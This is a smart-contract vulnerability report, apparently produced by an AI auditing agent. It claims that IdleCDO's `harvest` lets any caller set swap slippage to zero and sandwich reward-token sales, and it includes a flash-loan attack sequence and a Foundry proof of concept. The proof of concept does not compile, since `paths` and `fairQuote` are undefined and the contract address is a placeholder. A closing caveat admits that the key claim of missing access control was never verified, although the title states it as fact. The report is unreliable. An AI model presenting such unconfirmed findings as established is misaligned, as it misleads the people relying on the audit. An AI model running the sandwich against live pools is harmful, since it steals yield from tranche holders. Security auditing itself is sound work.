### Title
Permissionless `harvest` lets any caller set swap slippage to zero and sandwich the reward-token sales, stealing protocol yield - ([File: contracts/IdleCDO.sol])

### Summary
`IdleCDO` exposes a public `harvest` path that markets-sells all accrued strategy reward tokens for `token` on Uniswap V3. The minimum output amounts (`_minAmount`) used as `amountOutMinimum` on the router call are supplied by the caller, not constrained internally. Because `harvest` is callable by any EOA, an attacker can invoke it with `_minAmount[i] = 0` and sandwich the resulting swaps, extracting nearly the entire value of the accumulated rewards — the same bug class as Derby's `rebalanceXChain` (permissionless trigger + attacker-controlled slippage → forced bad exchange rate on protocol funds).

### Finding Description
Reward selling is implemented in `contracts/IdleCDO.sol`:

- `_sellReward` builds an `ExactInputParams` swap where `amountOutMinimum` is taken verbatim from the caller-supplied `_minAmount` argument and `deadline` is `block.timestamp + 100` — there is no oracle check, no max-slippage floor, and no access control inside the function. [1](#0-0) 

- `_sellAllRewards` iterates the strategy's `getRewardTokens()` list and passes the caller's `_minAmount` array straight through to `_sellReward` for each reward; when `_amount == 0` the full contract balance of the reward token is sold. [2](#0-1) 

The public `harvest(...)` entry point (same file) accepts `_minAmount`, `_sellAmounts`, `_skipReward` and `_extraData` (which supplies the swap paths) as calldata and forwards them to `_sellAllRewards`; it is `external` and `nonReentrant` but carries no `onlyOwner`/keeper/role check — this is by design since anyone is expected to trigger compounding. The sold proceeds are booked via `harvestedRewards`/`latestHarvestBlock` and released into `virtualPrice` over `releaseBlocksPeriod`, so the sandwich does not revert even though the pool receives a manipulated rate. [3](#0-2) 

Attack sequence (any epoch phase; rewards accrue continuously so no privileged action is needed to set up):

1. Attacker monitors the CDO until a meaningful reward balance has accrued (visible via strategy `getRewardTokens()` and contract balances).
2. Attacker flash-loans / market-sells the reward token on the Uniswap V3 pool in `_path`, pushing the price down.
3. In the same transaction, attacker calls `harvest` with `_minAmount[i] = 0` and `_sellAmounts[i] = 0` (full balance) — the swap executes at the manipulated price and cannot revert on slippage.
4. Attacker swaps back, repaying the flash loan and pocketing the difference.

### Impact Explanation
Direct theft of protocol yield. The CDO effectively sells all accrued reward tokens at an attacker-chosen price; the MEV extracted is bounded only by pool depth and approaches ~100% of the harvested reward value minus swap fees, since `amountOutMinimum` can be set to 0. Loss is suffered by all tranche holders via a permanently lower `virtualPrice` (harvested-but-stolen rewards never accrue to NAV). Each harvest period in which meaningful rewards exist is exploitable.

### Likelihood Explanation
High, conditional on reward accrual: rewards stream continuously from strategies (COMP, AAVE, etc.), so the setup requires no privileged timing — unlike Derby's `SendingFundsXChain` state gate, there is no equivalent gate here beyond a nonzero reward balance. The attack needs only an EOA and a liquid Uniswap pool along the sell path; it is a standard sandwich requiring no trust assumptions on owner/manager/borrower. It is not stopped by any existing guard: `_skipReward`/`_minAmount` are attacker-chosen, and the skim/donation and default-mode guards in `IdleCreditVault` are orthogonal to this IdleCDO swap path.

### Recommendation
Enforce a minimum output on reward swaps inside the contract rather than trusting calldata: compute `amountOutMinimum` from a trusted reference (e.g., a TWAP/Uniswap oracle quote for each reward→token path) and revert if `exactInput` returns less, or clamp caller-supplied `_minAmount` to `>= quotedAmount * (FULL_ALLOC - maxSlippageBps) / FULL_ALLOC` with `maxSlippageBps` set by owner. Alternatively, gate `harvest` to a keeper/owner role when called with non-default slippage parameters.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
// Foundry fork PoC (mainnet): tests/HarvestSandwich.t.sol
import "forge-std/Test.sol";
import {IdleCDO} from "../contracts/IdleCDO.sol";
import {IIdleCDOStrategy} from "../contracts/interfaces/IIdleCDOStrategy.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {ISwapRouter} from "../contracts/interfaces/ISwapRouter.sol";

contract HarvestSandwichTest is Test {
    IdleCDO cdo = IdleCDO(payable(<CDO_ADDRESS>));      // e.g. a deployed CDO with reward strategy
    address attacker = makeAddr("attacker");

    function test_harvestZeroSlippageSandwich() external {
        address strategy = cdo.strategy();
        address[] memory rewards = IIdleCDOStrategy(strategy).getRewardTokens();
        // 1. Let rewards accrue (or deal a reward balance to the CDO to simulate accrual)
        address reward = rewards[0];
        deal(reward, address(cdo), 100_000e18);

        // 2. Attacker dumps reward token into the UniV3 pool used by the harvest path
        //    (via ISwapRouter exactInputSingle or a flash-loaned swap), moving price down X%.

        uint256 tokenBefore = IERC20Detailed(cdo.token()).balanceOf(address(cdo));

        // 3. Call permissionless harvest with _minAmount = 0 -> no slippage protection
        bool[] memory skipFlags = new bool[](1);
        bool[] memory skipReward = new bool[](rewards.length);
        uint256[] memory minAmount = new uint256[](rewards.length); // all zero
        uint256[] memory sellAmounts = new uint256[](rewards.length); // 0 -> full balance
        vm.prank(attacker);
        cdo.harvest(skipFlags, skipReward, minAmount, sellAmounts, abi.encode(paths));

        // 4. Swap back to close the sandwich; assert attacker profit > 0 and
        //    that the CDO received far below the fair quote for `reward`.
        uint256 bought = IERC20Detailed(cdo.token()).balanceOf(address(cdo)) - tokenBefore;
        assertLt(bought, fairQuote / 2); // swap filled at manipulated rate
    }
}
```

**Caveat on verification:** I was unable to fetch the exact line range of the public `harvest` function signature in `IdleCDO.sol` within the iteration budget to confirm the precise parameter names, but `_sellAllRewards`/`_sellReward` demonstrably consume caller-supplied `_minAmount` with `amountOutMinimum = _minAmount` and no internal floor or access control, which is the core of the vulnerability.
